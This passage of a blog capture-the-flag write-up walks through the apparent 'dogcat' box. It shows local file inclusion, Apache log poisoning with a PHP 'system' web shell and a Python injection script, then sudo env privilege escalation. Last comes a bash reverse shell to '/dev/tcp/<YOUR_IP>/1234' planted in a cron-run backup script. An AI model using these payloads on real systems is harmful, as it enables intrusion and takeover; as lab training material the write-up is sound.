+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&amp;ext=
+</span></span></code></pre></div><p>and again afer decoding we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span></code></pre></div><blockquote>
+<p><strong><strong>/etc/passwd</strong></strong></p>
+</blockquote>
+<p>unfortunately nothing here would allow us to get into the box.</p>
+<p>since we can access the box&rsquo;s files, we can try to perform a <strong>log poisoning</strong>, we know that there is an <strong>apache</strong> server running so let&rsquo;s access it&rsquo;s logs file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>http://xx.xx.xx.xx/?view=./dog/../../../../../../../var/log/apache2/access.log&amp;ext
+</span></span></code></pre></div><p>we get the <strong>apache</strong> server logs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] &#34;GET /cgi-sys/finger.pl HTTP/1.1&#34; 404 490 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34; 
+</span></span><span style="display:flex;"><span>10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] &#34;GET /cgi-local/finger.pl HTTP/1.1&#34; 404 490 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34; 
+</span></span><span style="display:flex;"><span>10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] &#34;GET /htbin/finger.pl HTTP/1.1&#34; 404 490 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&#34;
+</span></span></code></pre></div><p>since the logs also shows the <strong>User-Agent</strong> parameter, we can try to inject a php script that we can use for code execution. The script will add a third parameter called <code>cmd</code> which will take in a command and execute it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>i created a python script that will inject the php script and print out the logs to the output of the command that we choose to pass in the <code>cmd</code> parameter:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;User-Agent&#34;</span>: payload
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;whoami&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://xx.xx.xx.xx/?view=./dog/../../../../../../../var/log/apache2/access.log&amp;ext&amp;cmd=</span><span style="color:#e6db74">{</span>cmd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url, headers)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>after running it we will get <strong>www-data</strong> instead of the <strong>User-Agent</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>10.18.91.159 - - [01/Dec/2023:19:04:19 +0000] &#34;GET /?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&amp;ext&amp;cmd=whoami HTTP/1.1&#34; 200 1108 &#34;-&#34; &#34;www-data&#34;
+</span></span></code></pre></div><p>now, let list the directory <code>/var/www/html</code>, we just need to change the command to <code>ls /var/www/html</code>.</p>
+<p>we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>cat.php
+</span></span><span style="display:flex;"><span>cats
+</span></span><span style="display:flex;"><span>dog.php
+</span></span><span style="display:flex;"><span>dogs
+</span></span><span style="display:flex;"><span>flag.php
+</span></span><span style="display:flex;"><span>index.php
+</span></span><span style="display:flex;"><span>style.css
+</span></span><span style="display:flex;"><span>test.php
+</span></span></code></pre></div><p>and here is our first flag in the <strong>flag.php</strong> file we can access like it so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag.php&amp;ext=
+</span></span></code></pre></div><p>now if we list the directory <code>/var/www/</code> we will find the second flag in a file named <strong>flag2_QMW7JvaY2LvK.txt</strong></p>
+<p>Since we can execute commands, we can get a reverse shell, checkout <a href="https://www.revshells.com/" target="_blank">revshells.com</a> to quicly generate a command to create a reverse shell with python, bash, perl &hellip;etc. I will be using metasploit.</p>
+<p>after getting a reverse shell we can try and see what we can run as <strong>sudo</strong> using the command <code>sudo -l</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User www-data may run the following commands on 5ab1679239ec:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/env
+</span></span></code></pre></div><p>We can run <code>/usr/bin/env</code> as root with no password required, this will help us escalate our previeleges to root, we can do that using the command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/env /bin/bash
+</span></span></code></pre></div><p>now that we are root let take a look at the <code>/root</code> directory and see what we can find:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>flag3.txt
+</span></span></code></pre></div><p>and voila we find the third flag in the <strong>flag3.txt</strong> file.</p>
+<p>the forth flag is outside the box, because this box is a container running inside an other box. We can see this if we go into <code>/opt/backups</code> and looking around the backups archive, we also see that the archibe has a very recent date when compared to the script, so that must mean the script is ran regurarly on the parent box.</p>
+<p>We can take advantage of this and get ourselves a reverse shell on the parent box:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;#!/bin/bash&#34;</span> &gt; backup.sh
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/1234 0&gt;&amp;1&#39;&#34;</span> &gt;&gt; backup.sh
+</span></span></code></pre></div><p>After few minutes we should get a connection from the parent box and then when we list our current directory we see the forth flag in a <strong>flag4.txt</strong> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>flag4.txt
+</span></span></code></pre></div><h1 id="ressources">Ressources</h1>
+<ul>
+<li><a href="https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/" target="_blank">Blog post explaining LFI, and how to exploit it.</a></li>
+<li><a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef for decoding.</a></li>
+<li><a href="https://blog.szymex.pw/thm/dogcat.html" target="_blank">szymex73&rsquo;s writeup which helped me figure out how to get the 4th flag.</a></li>
+</ul>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://ramsy0dev.github.io/posts/hello-world/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Hello World!!!</a>
+        
+	    
+    
+</div>
+
+  
+    <div class="comments">
+    
+        <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "ramsy0dev" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+
+        </div>
+    </body>
+</html>
